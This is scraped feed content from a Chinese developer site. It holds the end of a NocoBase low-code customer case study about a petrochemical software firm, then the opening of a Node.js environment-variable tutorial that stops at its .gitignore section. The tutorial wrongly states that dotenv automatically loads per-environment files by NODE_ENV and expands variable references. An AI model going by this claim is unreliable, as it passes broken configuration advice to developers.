<p>某科技公司（应客户要求匿名）是一家深耕石化行业的 ToB 软件企业。多年来，他们坚持自主研发，业务覆盖国内外数百家大型石化企业，是行业数字化领域的领先者。他们内部拥有成熟的自研低代码引擎，专门用于承载流程和表单类场景。</p>
<p>在持续推进项目交付的过程中，他们逐渐发现一些在石化行业普遍存在、同时也是许多 ToB 软件公司共同面临的挑战。</p>
<ol>
<li>
<h3 data-id="heading-3"><strong>定制需求成为常态</strong></h3>
</li>
</ol>
<p>无论产品设计多么周全，总会碰到无法满足客户需求的部分。</p>
<p>石化行业更明显：安全管理、隐患流程、承包商管理、作业票审批等场景的差异性极大，导致客户经常提出各种微调或个性化需求。</p>
<p>对软件公司而言，这些需求无法满足很有可能就无法通过招标。</p>
<p>并且，如果将定制功能放进主产品，将会污染产品代码、破坏版本稳定性。而单独开发一套带来的问题则是成本高且可维护性差。</p>
<ol start="2">
<li>
<h3 data-id="heading-4"><strong>自研低代码平台能力有限</strong></h3>
</li>
</ol>
<p>他们对不同低代码产品的能力边界非常清晰。自建的低代码平台定位为解决<strong>基础流程与表单类场景</strong>。但一些数据处理、交互灵活类的个性化需求就无法满足。</p>
<ol start="3">
<li>
<h3 data-id="heading-5"><strong>多系统数据割裂，集成成本高</strong></h3>
</li>
</ol>
<p>石化企业常年累积了大量系统（安环、设备、巡检、DCS、视频等），数据标准不统一、接口差异大，跨系统打通成本远高于应用层开发。</p>
<ol start="4">
<li>
<h3 data-id="heading-6"><strong>研发资源被不断稀释</strong></h3>
</li>
</ol>
<p>项目制交付、小模块补丁式需求持续占用研发时间，使团队难以专注核心能力建设。</p>
<h2 data-id="heading-7"><strong>选择新的低代码产品</strong></h2>
<p>在项目交付不断累积、内部自研平台能力无法满足后，他们开始系统性地评估市场上的各类低代码工具。他们希望找到一种能够：</p>
<ul>
<li>不干扰主产品</li>
<li>承载复杂且差异化场景</li>
<li>支撑跨系统数据整合</li>
<li>降低前后端协作成本</li>
<li>具备长期可扩展性</li>
</ul>
<p>在多轮试用与对比之后，他们最终选择了 <strong>NocoBase</strong>。</p>
<p>主要原因包括：</p>
<p><strong>1. 开源架构，可控性强</strong></p>
<p>对 ToB 软件公司而言，可控性是关键。即使未来场景演变或需求变深，也能够在代码层面进行定制和扩展，而不受平台限制。</p>
<p><strong>2. 多数据源支持，使跨系统贯通成为可能</strong></p>
<p>石化企业系统众多、数据分散，多数据源能力让他们能够在一个应用层中整合外部系统的数据，构建统一的业务视图和流程链路。</p>
<p><strong>3. 插件体系完善，扩展能力强且规范统一</strong></p>
<p>NocoBase 的插件机制，使他们能够为复杂需求快速构建独立模块，而不影响主产品结构。同时扩展逻辑清晰可控，便于长期维护。</p>
<p><strong>4. 权限、API 网关、多语言等底层能力接近企业级应用要求</strong></p>
<p>这些能力让他们能够在同一平台上支撑更复杂的角色体系、安全要求和开放场景，更适合行业级系统建设。</p>
<h2 data-id="heading-8">NocoBase 在企业内的两大核心使用场景</h2>
<h3 data-id="heading-9">场景一：客户需求扩展</h3>
<p>NocoBase 非常适合用来实现客户偶尔提出的一些<strong>与主产品无冲突但需要快速落地</strong>的需求。例如：在原系统菜单下扩展一个小页面，满足特有的业务步骤。</p>
<p>这些需求往往具有几个特点：</p>
<ul>
<li><strong>个性化非常强</strong>，没有可复制性</li>
<li><strong>不适合放进主产品</strong>，否则会破坏版本结构</li>
<li><strong>写代码也不划算</strong>，成本高、维护难</li>
<li>客户却<strong>明确要求必须解决</strong>（招标条款、项目验收或实际生产需要）</li>
</ul>
<p>而使用 NocoBase 后，他们形成了一种新的交付模式：</p>
<ul>
<li>在 NocoBase 中快速构建小模块</li>
<li>将用户体系、权限与数据同步到主产品</li>
<li>将模块无缝嵌入原系统菜单或页面结构</li>
<li>客户看到的是统一体验，而底层完全解耦</li>
</ul>
<p><strong>成果</strong></p>
<ul>
<li><strong>相同规模的需求扩展，人力成本下降约 70%</strong></li>
<li>不再需要前后端配合，大多数扩展由一位技术同事即可独立完成</li>
<li>大幅减少对主产品研发节奏的干扰</li>
</ul>
<h3 data-id="heading-10"><strong>场景二：内部管理工具</strong></h3>
<p>随着公司规模扩大、业务流程演进，内部管理系统的需求不断变化。</p>
<p>但让研发团队为内部需求开发系统，会直接影响主产品迭代；而采购商业 SaaS 又难以匹配公司自身流程。</p>
<p>NocoBase 在这里承担了一个“轻量内部系统平台”的角色：</p>
<ul>
<li>内部业务团队可以直接配置基础结构</li>
<li>多数场景无需前后端协作</li>
<li>小模块可随流程变化灵活调整</li>
<li>完全不占用核心研发产能</li>
</ul>
<p><strong>成果</strong></p>
<ul>
<li>主产品团队保持专注</li>
<li>内部系统建设速度加快</li>
<li>流程管理更贴近实际业务</li>
<li>整体组织效率提升，而研发压力没有增加</li>
</ul>
<h2 data-id="heading-11">结语</h2>
<p>ToB 软件企业的竞争核心始终是<strong>核心能力产品力和健康的项目利润率。</strong></p>
<p>该企业通过引入 NocoBase 明确了这一战略取舍：</p>
<ol>
<li><strong>聚焦核心研发：</strong> 将核心研发团队的精力从长尾需求中解脱出来，确保 100% 专注于高壁垒、高价值的核心系统升级。</li>
<li><strong>确保定制利润：</strong> 将零散的定制化需求转移到低成本、高效率的 NocoBase，极大地提高了项目交付阶段的毛利率。</li>
<li><strong>架构纯粹化：</strong> 实现了<strong>自研核心 + NocoBase 扩展的双模架构</strong>。主产品代码库保持稳定、纯净，产品迭代完全不受定制项目的拖累。</li>
</ol>
<p>在这样的路径下，企业既<strong>能保持产品的长期竞争力，又能以极低成本应对不断变化的一线业务。</strong></p>
<p><strong>更多 NocoBase 的用户故事：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fan-erp-built-with-nocobase" target="_blank" title="https://www.nocobase.com/cn/blog/an-erp-built-with-nocobase" ref="nofollow noopener noreferrer">社区用户分享：用 NocoBase 搭建可落地的 ERP </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fshenzhen-chuanglianyun-tech-development-methodology" target="_blank" title="https://www.nocobase.com/cn/blog/shenzhen-chuanglianyun-tech-development-methodology" ref="nofollow noopener noreferrer">8 人团队如何效率拉满？——创联云的开发方法论</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fai-multimodal-platform" target="_blank" title="https://www.nocobase.com/cn/blog/ai-multimodal-platform" ref="nofollow noopener noreferrer">华数传媒用 NocoBase 快速搭建 AI 多模态研发平台</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fnocobase-in-russia" target="_blank" title="https://www.nocobase.com/cn/blog/nocobase-in-russia" ref="nofollow noopener noreferrer">俄罗斯合作伙伴 Mobx，用 NocoBase 交付多场景方案</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Funiversity-course" target="_blank" title="https://www.nocobase.com/cn/blog/university-course" ref="nofollow noopener noreferrer">NocoBase 走进德国大学课堂</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fed" target="_blank" title="https://www.nocobase.com/cn/blog/ed" ref="nofollow noopener noreferrer">NocoBase 如何成为 ED 的技术底座，支撑内部系统到商业化产品？</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fclassact" target="_blank" title="https://www.nocobase.com/cn/blog/classact" ref="nofollow noopener noreferrer">数十万条数据秒级响应——Classact 在 Kubernetes 上的 NocoBase 应用实践</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fbielcrystal" target="_blank" title="https://www.nocobase.com/cn/blog/bielcrystal" ref="nofollow noopener noreferrer">年产量 18.5 亿，伯恩光学背后的数字敏捷工厂</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fdistinct-healthcare" target="_blank" title="https://www.nocobase.com/cn/blog/distinct-healthcare" ref="nofollow noopener noreferrer">卓正医疗如何用 NocoBase 搭建“家庭医生式”服务体系？</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js环境变量配置实战：手把手教你构建高效、安全的开发环境]]></title>    <link>https://juejin.cn/post/7581844141668548648</link>    <guid>https://juejin.cn/post/7581844141668548648</guid>    <pubDate>2025-12-10T05:44:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581844141668548648" data-draft-id="7581870491763540020" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js环境变量配置实战：手把手教你构建高效、安全的开发环境"/> <meta itemprop="keywords" content="后端,Node.js"/> <meta itemprop="datePublished" content="2025-12-10T05:44:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java水解"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js环境变量配置实战：手把手教你构建高效、安全的开发环境
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java水解
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:44:32.000Z" title="Wed Dec 10 2025 05:44:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">引言：为什么环境变量如此重要？</h3>
<p>想象一下这个场景：你正在开发一个Node.js应用，需要[连接数据库]。你可能会这样写：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ❌ 危险！不要这样做！</span>
<span class="hljs-type">const</span> dbConfig = {
    host: <span class="hljs-string">'localhost'</span>,
    port: <span class="hljs-number">3306</span>,
    user: <span class="hljs-string">'root'</span>,
    password: <span class="hljs-string">'mysecretpassword123'</span>,
    database: <span class="hljs-string">'myapp_dev'</span>
};
AI写代码
</code></pre>
<p>这段代码存在几个致命问题：</p>
<ol>
<li><strong>安全风险：</strong> 数据库密码直接暴露在代码中，一旦代码仓库（尤其是公开的GitHub）被泄露，后果不堪设想。</li>
<li><strong>环境耦合：</strong> 开发环境用<code>localhost</code>，生产环境可能用云数据库的公网IP。每次部署都要手动修改代码？</li>
<li><strong>协作困难：</strong> 团队成员的本地开发环境配置各不相同，如何保证每个人都能顺利运行项目？</li>
</ol>
<p><strong>环境变量（Environment Variables）</strong>  正是解决这些问题的“银弹”。它允许我们将配置信息与代码分离，实现：</p>
<ul>
<li><strong>安全性：</strong> 敏感信息（如密钥、密码）不进入代码仓库。</li>
<li><strong>灵活性：</strong> 轻松在不同环境（开发、测试、生产）间切换配置。</li>
<li><strong>可维护性：</strong> 配置集中管理，修改方便。</li>
</ul>
<hr/>
<h3 data-id="heading-1"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>一、 基础篇：理解 <code>process.env</code></h3>
<p>在Node.js中，所有环境变量都存储在全局对象 <code>process.env</code> 中。这是一个类似JavaScript对象的键值对集合。</p>
<h4 data-id="heading-2"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1. 查看当前环境变量</h4>
<p>在终端中，你可以使用以下命令查看所有环境变量：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Linux/macOS</span>
<span class="hljs-built_in">printenv</span>
 
<span class="hljs-comment"># Windows</span>
<span class="hljs-built_in">set</span>
AI写代码
</code></pre>
<p>在Node.js代码中，可以这样访问：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 查看所有环境变量</span>
console.<span class="hljs-built_in">log</span>(process.env);
 
<span class="hljs-comment">// 访问特定变量</span>
console.<span class="hljs-built_in">log</span>(process.env.PATH); <span class="hljs-comment">// 输出系统PATH</span>
console.<span class="hljs-built_in">log</span>(process.env.USER); <span class="hljs-comment">// 输出当前用户名</span>
AI写代码
</code></pre>
<h4 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. 在运行时设置环境变量</h4>
<p>最简单的方法是在启动Node.js应用时，通过命令行前缀设置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Linux/macOS</span>
<span class="hljs-attr">PORT</span>=<span class="hljs-number">3000</span> NODE_ENV=development node app.js
 
<span class="hljs-comment"># Windows (cmd)</span>
set <span class="hljs-attr">PORT</span>=<span class="hljs-number">3000</span> &amp;&amp; set NODE_ENV=development &amp;&amp; node app.js
 
<span class="hljs-comment"># Windows (PowerShell)</span>
$env:<span class="hljs-attr">PORT</span>=<span class="hljs-number">3000</span><span class="hljs-comment">; $env:NODE_ENV="development"; node app.js</span>
AI写代码
</code></pre>
<p>然后在 <code>app.js</code> 中：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> PORT = process.env.PORT || <span class="hljs-number">3000</span>; <span class="hljs-comment">// 如果没有设置PORT，则使用默认值3000</span>
<span class="hljs-type">const</span> NODE_ENV = process.env.NODE_ENV || <span class="hljs-string">'development'</span>;
 
console.<span class="hljs-built_in">log</span>(`<span class="hljs-built_in">Server</span> running on port ${PORT} in ${NODE_ENV} mode`);
AI写代码
</code></pre>
<p><strong>小贴士：</strong>  <code>NODE_ENV</code> 是一个非常重要的环境变量，许多库（如Express）会根据它的值调整行为（例如，生产环境会关闭详细错误信息）。</p>
<hr/>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>二、 进阶篇：使用 <code>dotenv</code> 库实现配置文件化</h3>
<p>每次启动都要手动输入环境变量，显然不现实。<code>dotenv</code> 库可以让我们将环境变量存储在 <code>.env</code> 文件中，启动时自动加载。</p>
<h4 data-id="heading-5"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1. 安装与初始化</h4>
<pre><code class="hljs">npm install dotenv
AI写代码
</code></pre>
<h4 data-id="heading-6"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. 创建 <code>.env</code> 文件</h4>
<p>在项目根目录创建 <code>.env</code> 文件：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># .env - 开发环境配置</span>
<span class="hljs-attr">PORT</span>=<span class="hljs-number">3000</span>
<span class="hljs-attr">NODE_ENV</span>=development
<span class="hljs-attr">DB_HOST</span>=localhost
<span class="hljs-attr">DB_PORT</span>=<span class="hljs-number">3306</span>
<span class="hljs-attr">DB_USER</span>=root
<span class="hljs-attr">DB_PASSWORD</span>=mysecretpassword123
<span class="hljs-attr">DB_NAME</span>=myapp_dev
<span class="hljs-attr">API_KEY</span>=sk_test_1234567890abcdef
AI写代码
</code></pre>
<h4 data-id="heading-7"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3. 加载 <code>dotenv</code></h4>
<p>在应用的<strong>最开始</strong>（通常是 <code>app.js</code> 或 <code>server.js</code> 的第一行）引入并配置 <code>dotenv</code>：</p>
<pre><code class="hljs language-ini" lang="ini">// app.js
require('dotenv').config()<span class="hljs-comment">; // ⚠️ 必须是第一行！</span>
 
const <span class="hljs-attr">express</span> = require(<span class="hljs-string">'express'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">app</span> = express()<span class="hljs-comment">;</span>
 
const <span class="hljs-attr">PORT</span> = process.env.PORT || <span class="hljs-number">3000</span><span class="hljs-comment">;</span>
const <span class="hljs-attr">NODE_ENV</span> = process.env.NODE_ENV<span class="hljs-comment">;</span>
 
// ... 其他代码
AI写代码
</code></pre>
<p><strong>重要：</strong>  <code>dotenv.config()</code> 必须在任何使用 <code>process.env</code> 的代码之前执行。</p>
<h4 data-id="heading-8"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4. 多环境配置：<code>.env.development</code>, <code>.env.production</code></h4>
<p>为了更好地管理不同环境，我们可以创建多个 <code>.env</code> 文件：</p>
<ul>
<li><code>.env</code> (通用配置，可被覆盖)</li>
<li><code>.env.local</code> (本地覆盖，通常不提交到Git)</li>
<li><code>.env.development</code> (开发环境)</li>
<li><code>.env.test</code> (测试环境)</li>
<li><code>.env.production</code> (生产环境)</li>
</ul>
<p><code>dotenv</code> 会根据 <code>NODE_ENV</code> 的值自动加载对应的文件。例如：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 启动开发环境</span>
<span class="hljs-attr">NODE_ENV</span>=development node app.js <span class="hljs-comment"># 会加载 .env 和 .env.development</span>
 
<span class="hljs-comment"># 启动生产环境</span>
<span class="hljs-attr">NODE_ENV</span>=production node app.js <span class="hljs-comment"># 会加载 .env 和 .env.production</span>
AI写代码
</code></pre>
<p><strong>.env.development 示例：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># .env.development</span>
<span class="hljs-attr">NODE_ENV</span>=development
<span class="hljs-attr">PORT</span>=<span class="hljs-number">3000</span>
<span class="hljs-attr">DB_HOST</span>=localhost
<span class="hljs-attr">DB_NAME</span>=myapp_dev
<span class="hljs-comment"># 开发环境可能不需要密码，或使用简单密码</span>
<span class="hljs-attr">DB_PASSWORD</span>=devpass
AI写代码
</code></pre>
<p><strong>.env.production 示例：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># .env.production</span>
<span class="hljs-attr">NODE_ENV</span>=production
<span class="hljs-attr">PORT</span>=<span class="hljs-number">8080</span>
<span class="hljs-attr">DB_HOST</span>=prod-db.myapp.com
<span class="hljs-attr">DB_NAME</span>=myapp_prod
<span class="hljs-comment"># 生产环境密码必须复杂，且不应出现在代码中</span>
<span class="hljs-attr">DB_PASSWORD</span>=<span class="hljs-variable">${DB_PROD_PASSWORD}</span> <span class="hljs-comment"># 使用系统环境变量</span>
AI写代码
</code></pre>
<hr/>
<h3 data-id="heading-9"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>三、 实战：构建一个健壮的配置管理模块</h3>
<p>[硬编码] <code>process.env.XXX</code> 在多处使用，既不优雅也容易出错。我们来创建一个专门的配置模块。</p>
<h4 data-id="heading-10"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1. 创建 <code>config/index.js</code></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// config/index.js</span>
require(<span class="hljs-string">'dotenv'</span>).config();
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">constructor</span>() {
        <span class="hljs-keyword">this</span>.port = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'PORT'</span>, <span class="hljs-number">3000</span>);
        <span class="hljs-keyword">this</span>.nodeEnv = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'NODE_ENV'</span>, <span class="hljs-string">'development'</span>);
        <span class="hljs-keyword">this</span>.isProduction = <span class="hljs-keyword">this</span>.nodeEnv === <span class="hljs-string">'production'</span>;
        <span class="hljs-keyword">this</span>.isDevelopment = <span class="hljs-keyword">this</span>.nodeEnv === <span class="hljs-string">'development'</span>;
        <span class="hljs-keyword">this</span>.isTest = <span class="hljs-keyword">this</span>.nodeEnv === <span class="hljs-string">'test'</span>;
 
        <span class="hljs-keyword">this</span>.db = {
            host: <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'DB_HOST'</span>, <span class="hljs-string">'localhost'</span>),
            port: <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'DB_PORT'</span>, <span class="hljs-number">3306</span>),
            user: <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'DB_USER'</span>),
            password: <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'DB_PASSWORD'</span>),
            database: <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'DB_NAME'</span>)
        };
 
        <span class="hljs-keyword">this</span>.api = {
            key: <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">'API_KEY'</span>)
        };
 
        <span class="hljs-comment">// 验证必要配置</span>
        <span class="hljs-keyword">this</span>.validate();
    }
 
    <span class="hljs-comment">/**
     * 获取环境变量，支持默认值
     * <span class="hljs-doctag">@param</span> {string} key - 环境变量键
     * <span class="hljs-doctag">@param</span> {*} defaultValue - 默认值
     * <span class="hljs-doctag">@returns</span> {*}
     */</span>
    <span class="hljs-keyword">get</span>(key, defaultValue = undefined) {
        <span class="hljs-keyword">return</span> process.env[key] || defaultValue;
    }
 
    <span class="hljs-comment">/**
     * 验证必要配置是否存在
     */</span>
    validate() {
        <span class="hljs-keyword">const</span> required = [<span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'API_KEY'</span>];
        <span class="hljs-keyword">const</span> missing = [];
 
        required.forEach(key =&gt; {
            <span class="hljs-keyword">if</span> (!process.env[key]) {
                missing.push(key);
            }
        });
 
        <span class="hljs-keyword">if</span> (missing.length &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> new Error(`Missing required environment variables: ${missing.join(<span class="hljs-string">', '</span>)}`);
        }
    }
}
 
<span class="hljs-comment">// 创建单例</span>
<span class="hljs-keyword">const</span> config = new Config();
module.exports = config;
AI写代码
</code></pre>
<h4 data-id="heading-11"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. 在应用中使用</h4>
<pre><code class="hljs language-ini" lang="ini">// app.js
const <span class="hljs-attr">config</span> = require(<span class="hljs-string">'./config'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">express</span> = require(<span class="hljs-string">'express'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">app</span> = express()<span class="hljs-comment">;</span>
 
app.listen(config.port, () =&gt; {
    console.log(`Server running on port ${config.port} in ${config.nodeEnv} mode`)<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
 
// 连接数据库示例
// const <span class="hljs-attr">mysql</span> = require(<span class="hljs-string">'mysql2'</span>)<span class="hljs-comment">;</span>
// const <span class="hljs-attr">connection</span> = mysql.createConnection(config.db)<span class="hljs-comment">;</span>
AI写代码
</code></pre>
<p><strong>优势：</strong></p>
<ul>
<li><strong>集中管理：</strong> 所有配置在一个地方。</li>
<li><strong>类型安全（部分）：</strong> 提供默认值，避免 <code>undefined</code> 错误。</li>
<li><strong>验证：</strong> 启动时检查必要配置，防止运行时崩溃。</li>
<li><strong>语义化：</strong> <code>config.db.host</code> 比 <code>process.env.DB_HOST</code> 更清晰。</li>
</ul>
<hr/>
<h3 data-id="heading-12"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>四、 安全与最佳实践</h3>
<h4 data-id="heading-13"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1. <code>.gitignore</code> 是你的第一道防线</h4>
<p><strong>绝对不要</strong>将包含敏感信息的 <code>.env</code> 文件提交到版本控制系统！</p>
<p>在 <code>.gitignore</code> 文件中添加：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Environment variables</span>
.<span class="hljs-built_in">env</span>
.env.local
.<span class="hljs-built_in">env</span>.*.<span class="hljs-built_in">local</span>
*.<span class="hljs-built_in">env</span>
AI写代码
</code></pre>
